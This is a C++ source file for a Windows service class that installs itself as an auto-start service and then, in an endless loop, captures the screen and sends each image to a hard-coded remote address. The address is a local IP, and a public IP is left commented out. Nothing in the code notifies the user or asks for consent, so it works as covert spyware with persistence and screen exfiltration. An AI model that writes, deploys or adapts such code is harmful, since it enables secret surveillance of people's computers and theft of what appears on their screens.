#include "service_manager.h"

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

extern void WINAPI service_handler(DWORD);
extern void WINAPI service_main(DWORD, LPTSTR*);

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

ServiceManager::ServiceManager(string name) {
    TCHAR binary_path[MAX_PATH];

    this->name = name;
    this->ghSvcStopEvent = NULL;

    this->path = "";
    if (GetModuleFileName(NULL, binary_path, MAX_PATH)) {
        this->path = binary_path;
    }
}

//------------------------------------------------------------------------------

ServiceManager::~ServiceManager(void) {}

//------------------------------------------------------------------------------

void ServiceManager::main(void) {
    ScreenManager screen_manager = ScreenManager();

    // string hostname = "192.241.213.182";
    string hostname = "192.168.0.118";
    SOCKET socket = 0;

    while (1) {
        if (socket == 0) {
            socket = connect(hostname, 61500);
        }

        if (socket != 0) {
            string image = screen_manager.capture();
            send_image(socket, image, hostname);
        }

        wait();
    }

    if (socket != 0) {
        disconnect(socket);
    }
}

//------------------------------------------------------------------------------

void ServiceManager::install(void) {
    SC_HANDLE sc_manager;
    SC_HANDLE service;

    if (this->path == "") {
        this->log("Cannot install service");
        return;
    }

    sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == sc_manager) {
        this->log("OpenSCManager failed");
        return;
    }

    service = CreateService(sc_manager, this->name.c_str(), this->name.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL, this->path.c_str(), NULL, NULL, NULL, NULL, NULL);

    if (service == NULL) {
        this->log("CreateService failed");
        CloseServiceHandle(sc_manager);
        return;
    } else {
        this->log("Service installed successfully", false);
    }

    CloseServiceHandle(service);
    CloseServiceHandle(sc_manager);
}

//------------------------------------------------------------------------------

void ServiceManager::init(DWORD dwArgc, LPTSTR *lpszArgv) {
    this->ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (this->ghSvcStopEvent == NULL) {
        this->report_status(SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }

    this->report_status(SERVICE_RUNNING, NO_ERROR, 0);

    this->main();
}

//------------------------------------------------------------------------------

void ServiceManager::start_service_ctrl_dispatcher(void) {
    SERVICE_TABLE_ENTRY dispatch_table[] = {
        {(char *)this->name.c_str(), (LPSERVICE_MAIN_FUNCTION) service_main},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(dispatch_table)) {
        this->report_event("StartServiceCtrlDispatcher");
    }
}

//------------------------------------------------------------------------------

void ServiceManager::report_status(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;

    this->gSvcStatus.dwCurrentState = dwCurrentState;
    this->gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    this->gSvcStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        this->gSvcStatus.dwControlsAccepted = 0;
    else this->gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
        this->gSvcStatus.dwCheckPoint = 0;
    else this->gSvcStatus.dwCheckPoint = dwCheckPoint++;

    SetServiceStatus(this->gSvcStatusHandle, &this->gSvcStatus);
}

//------------------------------------------------------------------------------

void ServiceManager::report_event(string event) {
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    ostringstream buffer;

    hEventSource = RegisterEventSource(NULL, this->name.c_str());

    if (NULL != hEventSource) {
        buffer << event << " failed with " << GetLastError();

        lpszStrings[0] = this->name.c_str();
        lpszStrings[1] = buffer.str().c_str();

        ReportEvent(hEventSource, EVENTLOG_ERROR_TYPE, 0, 0, NULL, 2, 0, lpszStrings, NULL);

        DeregisterEventSource(hEventSource);
    }
}

//------------------------------------------------------------------------------

void ServiceManager::log(string message, bool show_last_error) {
    cout << message;

    if (show_last_error) {
        cout << " (" << GetLastError() << ")";
    }

    cout << endl;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
